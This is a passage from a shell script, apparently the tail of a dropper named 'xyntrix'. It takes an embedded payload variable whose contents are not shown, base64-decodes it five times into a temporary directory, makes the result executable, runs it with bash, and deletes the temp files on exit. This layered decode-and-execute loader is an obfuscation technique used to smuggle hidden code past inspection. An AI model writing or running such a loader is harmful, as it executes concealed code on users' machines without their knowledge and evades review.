)
concat=$(printf "%s" "$_PAYLOAD" | tr -d '\n')
if [ -z "$concat" ]; then
  echo "xyntrix payload kosong"
  exit 2
fi
PID=$$
TMPDIR=""
if TMPDIR=$(mktemp -d /tmp/xyntrix.XXXXXX 2>/dev/null); then
  :
else
  TMPDIR="$PWD/.xyntrix_${PID}"
  mkdir -p "$TMPDIR" || { echo ""; exit 3; }
fi
trap 'rm -rf "$TMPDIR"' EXIT
FIRST="$TMPDIR/1"
if printf '' | base64 --decode >/dev/null 2>&1; then
  DECMODE=long
else
  DECMODE=short
fi
if [ "$DECMODE" = "long" ]; then
  printf "%s" "$concat" | base64 --decode > "$FIRST" 2>/dev/null
else
  printf "%s" "$concat" | base64 -d > "$FIRST" 2>/dev/null
fi
cur="$FIRST"
i=2
while [ $i -le 5 ]; do
  nxt="$TMPDIR/$i"
  if [ "$DECMODE" = "long" ]; then
    base64 --decode < "$cur" > "$nxt" 2>/dev/null
  else
    base64 -d < "$cur" > "$nxt" 2>/dev/null
  fi
  cur="$nxt"
  i=$((i+1))
done
if [ -s "$cur" ]; then
  chmod +x "$cur" 2>/dev/null || true
  bash "$cur"
else
  echo "xyntrix "
  exit 7
fi
exit 0
